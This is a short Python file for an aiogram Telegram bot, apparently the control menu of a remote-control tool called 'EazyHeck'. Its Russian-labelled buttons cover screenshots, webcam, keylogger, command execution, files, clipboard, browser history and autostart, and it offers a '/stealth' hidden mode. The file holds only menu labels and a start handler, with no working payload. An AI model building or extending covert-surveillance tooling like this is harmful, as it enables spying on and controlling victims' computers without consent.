from aiogram import Router
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
from aiogram.filters import CommandStart

router = Router()

menu = ReplyKeyboardMarkup(keyboard=[
    [KeyboardButton(text="📸 Скриншот"), KeyboardButton(text="💻 Система")],
    [KeyboardButton(text="⚙️ Команда"), KeyboardButton(text="📁 Файлы")],
    [KeyboardButton(text="🔧 Процессы"), KeyboardButton(text="🔊 Громкость")],
    [KeyboardButton(text="🔴 Запись экрана"), KeyboardButton(text="📋 Буфер")],
    [KeyboardButton(text="🔔 Уведомление"), KeyboardButton(text="⏻ Питание")],
    [KeyboardButton(text="📷 Вебкамера"), KeyboardButton(text="🌐 Открыть URL")],
    [KeyboardButton(text="🔑 Кейлоггер"), KeyboardButton(text="🖱 Мышь/Клава")],
    [KeyboardButton(text="🔌 Wi-Fi сети"), KeyboardButton(text="⏰ Планировщик")],
    [KeyboardButton(text="📊 График"), KeyboardButton(text="📡 Интернет")],
    [KeyboardButton(text="🎵 Медиа"), KeyboardButton(text="📺 Дисплей")],
    [KeyboardButton(text="🔐 Автозапуск"), KeyboardButton(text="📦 Программы")],
    [KeyboardButton(text="💬 Чат с ПК"), KeyboardButton(text="🌐 История браузера")],
    [KeyboardButton(text="🎨 Обои"), KeyboardButton(text="🔀 Бесить мышь")],
    [KeyboardButton(text="🖱 Поменять кнопки мыши")],
], resize_keyboard=True)

@router.message(CommandStart())
async def start(message: Message):
    await message.answer(
        "👋 <b>EazyHeck</b> запущен!\n\n"
        "🕵️ Скрытый режим: /stealth\n"
        "🖥 Показать окно: /showwindow\n\n"
        "Выбери действие:",
        reply_markup=menu
    )
